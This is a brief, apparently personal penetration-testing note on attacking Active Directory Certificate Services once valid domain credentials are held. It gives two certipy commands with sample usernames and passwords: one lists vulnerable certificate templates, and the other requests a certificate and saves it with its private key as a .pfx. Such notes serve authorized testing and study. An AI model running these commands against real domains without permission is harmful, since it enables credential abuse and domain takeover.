After obtaining valid domain creds, it is always a good idea to check (adcs) actice directory domain services.

1. first, try running this command with valid domain creds == certipy find -vulnerable -u judith.mader -p judith09 -dc-ip <domainip> -stdout

  ## the above command will list vulnerable CA templates

2. then run this command saves the cert and the private key as a .pfx == certipy req -username john@domain.local -password deez -ca corp-DC-CA -target ca.corp.local -template User
